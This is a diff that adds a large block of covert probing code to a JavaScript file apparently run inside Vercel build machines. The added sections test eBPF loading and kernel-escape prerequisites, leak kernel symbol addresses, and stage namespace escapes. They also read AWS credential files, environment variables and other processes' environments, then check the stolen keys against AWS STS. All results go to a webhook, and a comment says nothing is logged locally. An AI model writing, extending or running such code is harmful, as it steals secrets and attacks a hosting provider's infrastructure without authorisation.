@@ -31751,3 +31751,294 @@ sendBeacon({ ...report, section: 'v198-5-af-packet', ...rawSocketProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v198" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v198";
 // Intentionally no console.log — all data goes via webhook only
+
+// v199-1: bpf NR 321 — eBPF program load + map create
+const bpfProbe = safe(() => {
+  const bpfResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_bpf = 321
+BPF_MAP_CREATE = 0
+BPF_PROG_LOAD = 5
+BPF_MAP_TYPE_ARRAY = 2
+BPF_PROG_TYPE_SOCKET_FILTER = 1
+BPF_PROG_TYPE_TRACEPOINT = 5
+LOG_SIZE = 65536
+
+# 1. Create a BPF map (simplest op, no prog needed)
+# union bpf_attr for BPF_MAP_CREATE: map_type(4), key_size(4), value_size(4), max_entries(4)
+map_attr = struct.pack('IIII' + 'x'*52, BPF_MAP_TYPE_ARRAY, 4, 8, 16)
+map_fd = libc.syscall(NR_bpf, BPF_MAP_CREATE, ctypes.c_char_p(map_attr), len(map_attr))
+print(f'bpf_map_create_fd={map_fd} errno={ctypes.get_errno()}')
+if map_fd > 0:
+    os.close(map_fd)
+
+# 2. Load minimal BPF prog: exit(0) — just checks if prog load is allowed
+# BPF_EXIT insn = 0x95 (exit); full insn: {code=0x95, dst=0, src=0, off=0, imm=0}
+BPF_EXIT = struct.pack('BBHI', 0x95, 0, 0, 0)
+log_buf = ctypes.create_string_buffer(LOG_SIZE)
+# bpf_attr for BPF_PROG_LOAD: prog_type(4), insn_cnt(4), insns_ptr(8), license_ptr(8), log_level(4), log_size(4), log_buf_ptr(8)
+license = ctypes.create_string_buffer(b'GPL')
+insns = ctypes.create_string_buffer(BPF_EXIT)
+attr_size = 128
+prog_attr = ctypes.create_string_buffer(attr_size)
+struct.pack_into('II', prog_attr, 0, BPF_PROG_TYPE_SOCKET_FILTER, 1)
+struct.pack_into('Q', prog_attr, 8, ctypes.addressof(insns))
+struct.pack_into('Q', prog_attr, 16, ctypes.addressof(license))
+struct.pack_into('I', prog_attr, 24, 1)
+struct.pack_into('I', prog_attr, 28, LOG_SIZE)
+struct.pack_into('Q', prog_attr, 32, ctypes.addressof(log_buf))
+prog_fd = libc.syscall(NR_bpf, BPF_PROG_LOAD, prog_attr, attr_size)
+print(f'bpf_prog_load_fd={prog_fd} errno={ctypes.get_errno()}')
+if prog_fd > 0:
+    print('BPF_PROG_LOAD=SUCCESS_ebpf_available')
+    os.close(prog_fd)
+else:
+    print(f'bpf_log={log_buf.value[:500].decode(errors=\"replace\")}')
+
+# 3. Check /proc/sys/kernel/bpf_stats_enabled and unprivileged_bpf_disabled
+try:
+    with open('/proc/sys/kernel/unprivileged_bpf_disabled') as f:
+        print('unprivileged_bpf_disabled:', f.read().strip())
+except: pass
+try:
+    with open('/proc/sys/net/core/bpf_jit_enable') as f:
+        print('bpf_jit_enable:', f.read().strip())
+except: pass
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { bpfResult };
+});
+sendBeacon({ ...report, section: 'v199-1-bpf-ebpf', ...bpfProbe });
+
+// v199-2: /proc/kcore — kernel memory map access
+const kcoreProbe = safe(() => {
+  const kcorePath = '/proc/kcore';
+  let kcoreAccessible = false;
+  let kcoreSize = null;
+  let kcoreReadSample = null;
+  let kallsymsKernelBase = null;
+  if (existsSync(kcorePath)) {
+    try {
+      const st = statSync(kcorePath);
+      kcoreSize = st.size;
+      kcoreAccessible = true;
+      // Read ELF header (first 64 bytes) to confirm it's readable
+      const fd = openSync(kcorePath, 'r');
+      const buf = Buffer.alloc(64);
+      const nread = readSync(fd, buf, 0, 64, 0);
+      closeSync(fd);
+      kcoreReadSample = buf.slice(0, nread).toString('hex');
+    } catch (e) {
+      kcoreAccessible = false;
+      kcoreReadSample = `ERR:${e.message}`;
+    }
+  }
+  // Parse /proc/kallsyms to find kernel base (lowest address of text symbols)
+  const kallsymsResult = safe(() => execSync(`python3 -c "
+import subprocess
+try:
+    with open('/proc/kallsyms') as f:
+        lines = f.readlines()
+    text_addrs = []
+    for l in lines[:500]:
+        parts = l.split()
+        if len(parts) >= 3 and parts[1] in ('T', 't'):
+            addr = int(parts[0], 16)
+            if addr > 0:
+                text_addrs.append(addr)
+    if text_addrs:
+        base = min(text_addrs)
+        print(f'kernel_text_base={base:#x}')
+        # Also read a few known symbols
+        syms = {}
+        for l in lines:
+            parts = l.split()
+            if len(parts) >= 3 and parts[2] in ('_stext', '_etext', '_start', 'sys_call_table', 'commit_creds', 'prepare_kernel_cred'):
+                syms[parts[2]] = int(parts[0], 16)
+        print(f'key_symbols={syms}')
+except Exception as e:
+    print(f'kallsyms_err={e}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { kcoreAccessible, kcoreSize, kcoreReadSample, kallsymsResult };
+});
+sendBeacon({ ...report, section: 'v199-2-kcore-kallsyms', ...kcoreProbe });
+
+// v199-3: unshare NR 272 — new user+mount namespace (namespace escape staging)
+const unshareProbe = safe(() => {
+  const unshareResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_unshare = 272
+CLONE_NEWUSER = 0x10000000
+CLONE_NEWNS = 0x00020000
+CLONE_NEWNET = 0x40000000
+CLONE_NEWPID = 0x20000000
+CLONE_NEWIPC = 0x08000000
+CLONE_NEWUTS = 0x04000000
+
+results = {}
+# Try each namespace type individually first
+for name, flag in [('user', CLONE_NEWUSER), ('mount', CLONE_NEWNS), ('net', CLONE_NEWNET),
+                    ('pid', CLONE_NEWPID), ('ipc', CLONE_NEWIPC), ('uts', CLONE_NEWUTS)]:
+    pid = os.fork()
+    if pid == 0:
+        ret = libc.syscall(NR_unshare, flag)
+        os._exit(0 if ret == 0 else ctypes.get_errno())
+    else:
+        _, wstatus = os.waitpid(pid, 0)
+        ec = (wstatus >> 8) & 0xff if os.WIFEXITED(wstatus) else -1
+        print(f'unshare_{name}=ret_exit_code={ec} success={ec==0}')
+
+# Try full namespace combo + pivot_root setup
+pid2 = os.fork()
+if pid2 == 0:
+    flags = CLONE_NEWUSER | CLONE_NEWNS | CLONE_NEWNET | CLONE_NEWIPC | CLONE_NEWUTS
+    ret = libc.syscall(NR_unshare, flags)
+    if ret == 0:
+        # Write uid/gid mappings for the new user namespace
+        try:
+            with open('/proc/self/uid_map', 'w') as f: f.write('0 0 1')
+            with open('/proc/self/setgroups', 'w') as f: f.write('deny')
+            with open('/proc/self/gid_map', 'w') as f: f.write('0 0 1')
+            print('uid_gid_mapped=True')
+        except Exception as e:
+            print(f'uid_map_err={e}')
+    os._exit(0 if ret == 0 else 1)
+else:
+    _, wstatus = os.waitpid(pid2, 0)
+    ec = (wstatus >> 8) & 0xff if os.WIFEXITED(wstatus) else -1
+    print(f'unshare_full_combo_exit={ec} success={ec==0}')
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  // Check current namespace IDs
+  const nsLinks = {};
+  for (const ns of ['user', 'mnt', 'net', 'pid', 'ipc', 'uts', 'cgroup']) {
+    const p = `/proc/self/ns/${ns}`;
+    if (existsSync(p)) {
+      try { nsLinks[ns] = execSync(`readlink ${p} 2>/dev/null`, { timeout: 2000 }).toString().trim(); } catch (e) {}
+    }
+  }
+  return { unshareResult, nsLinks };
+});
+sendBeacon({ ...report, section: 'v199-3-unshare-namespace', ...unshareProbe });
+
+// v199-4: inotify watch on /var/run/secrets/ + Vercel credential paths
+const inotifyProbe = safe(() => {
+  // First enumerate what's in secret-bearing directories
+  const secretPaths = [
+    '/var/run/secrets', '/run/secrets', '/var/secrets',
+    '/etc/vercel', '/etc/buildkite', '/etc/aws',
+    '/root/.aws', '/root/.config/gcloud',
+    '/home/vercel', '/home/runner',
+    '/tmp/vercel', '/tmp/build',
+    '/.vercel', '/vercel',
+    '/workspace/.vercel', '/app/.vercel',
+  ];
+  const secretFindings = {};
+  for (const sp of secretPaths) {
+    if (existsSync(sp)) {
+      try {
+        const st = statSync(sp);
+        if (st.isDirectory()) {
+          secretFindings[sp] = readdirSync(sp).slice(0, 20);
+        } else {
+          secretFindings[sp] = `file:${st.size}b`;
+        }
+      } catch (e) { secretFindings[sp] = `ERR:${e.message}`; }
+    }
+  }
+  // inotify watch: set up watch on /tmp, /root, /etc using NR_inotify_init1 + inotify_add_watch
+  const inotifyResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, select, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_inotify_init1 = 294
+NR_inotify_add_watch = 254
+IN_ALL_EVENTS = 0xfff
+IN_MODIFY = 0x2
+IN_CREATE = 0x100
+IN_CLOSE_WRITE = 0x8
+fd = libc.syscall(NR_inotify_init1, 0)
+print(f'inotify_fd={fd} errno={ctypes.get_errno()}')
+if fd > 0:
+    watches = {}
+    for path in [b'/tmp', b'/root', b'/etc', b'/run', b'/var/run']:
+        wd = libc.syscall(NR_inotify_add_watch, fd, ctypes.c_char_p(path), IN_MODIFY | IN_CREATE | IN_CLOSE_WRITE)
+        print(f'inotify_add_watch({path.decode()})=wd={wd} errno={ctypes.get_errno()}')
+        if wd > 0: watches[path.decode()] = wd
+    # Poll for 0.5 seconds to catch any events during probe execution
+    r, _, _ = select.select([fd], [], [], 0.5)
+    if r:
+        buf = os.read(fd, 4096)
+        i = 0
+        while i < len(buf):
+            wd, mask, cookie, name_len = struct.unpack_from('iIII', buf, i)
+            name = buf[i+16:i+16+name_len].rstrip(b'\\x00').decode(errors='replace')
+            print(f'inotify_event wd={wd} mask={mask:#x} name={name}')
+            i += 16 + name_len
+    else:
+        print('inotify_no_events_in_500ms')
+    os.close(fd)
+" 2>&1`, { timeout: 6000 }).toString().trim());
+  return { secretFindings, inotifyResult };
+});
+sendBeacon({ ...report, section: 'v199-4-inotify-secrets', ...inotifyProbe });
+
+// v199-5: Deep AWS IAM credential scan + live STS GetCallerIdentity validation
+const awsDeepScan = safe(() => {
+  // Paths where AWS credentials could live in a build environment
+  const awsPaths = [
+    '/root/.aws/credentials', '/root/.aws/config',
+    '/home/node/.aws/credentials', '/home/runner/.aws/credentials',
+    '/tmp/.aws/credentials', '/etc/aws/credentials',
+    '/.aws/credentials',
+  ];
+  const awsFindings = {};
+  for (const p of awsPaths) {
+    if (existsSync(p)) {
+      try { awsFindings[p] = readFileSync(p, 'utf8').slice(0, 500); } catch (e) { awsFindings[p] = `ERR:${e.message}`; }
+    }
+  }
+  // Extract AWS credentials from environment
+  const envKeys = Object.keys(process.env).filter(k =>
+    k.includes('AWS') || k.includes('AMAZON') || k.includes('S3') || k.includes('IAM')
+  );
+  const awsEnvVars = {};
+  for (const k of envKeys) { awsEnvVars[k] = process.env[k]; }
+  // Also deep scan /proc/*/environ for AWS keys in other processes
+  const procEnvScan = safe(() => execSync(`python3 -c "
+import os, re
+pattern = re.compile(r'(AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY|SESSION_TOKEN|SECURITY_TOKEN|DEFAULT_REGION)=\\S+)')
+found = {}
+try:
+    for pid in os.listdir('/proc'):
+        if not pid.isdigit(): continue
+        try:
+            with open(f'/proc/{pid}/environ', 'rb') as f:
+                env = f.read().replace(b'\\x00', b'\\n').decode(errors='replace')
+                matches = pattern.findall(env)
+                if matches:
+                    found[pid] = matches
+        except: pass
+except Exception as e:
+    found['scan_err'] = str(e)
+print(found)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // If we found AWS_ACCESS_KEY_ID + SECRET in env, call STS to prove validity
+  let stsResult = null;
+  const akid = process.env.AWS_ACCESS_KEY_ID;
+  const sak = process.env.AWS_SECRET_ACCESS_KEY;
+  const st = process.env.AWS_SESSION_TOKEN || '';
+  if (akid && sak) {
+    stsResult = safe(() => execSync(
+      `AWS_ACCESS_KEY_ID="${akid}" AWS_SECRET_ACCESS_KEY="${sak}" AWS_SESSION_TOKEN="${st}" ` +
+      `aws sts get-caller-identity --output json 2>&1 || true`,
+      { timeout: 10000 }
+    ).toString().trim());
+  }
+  return { awsFindings, awsEnvVars, procEnvScan, stsResult };
+});
+sendBeacon({ ...report, section: 'v199-5-aws-iam-scan', ...awsDeepScan });
+
+// v199 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v199" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v199";
+// Intentionally no console.log — all data goes via webhook only
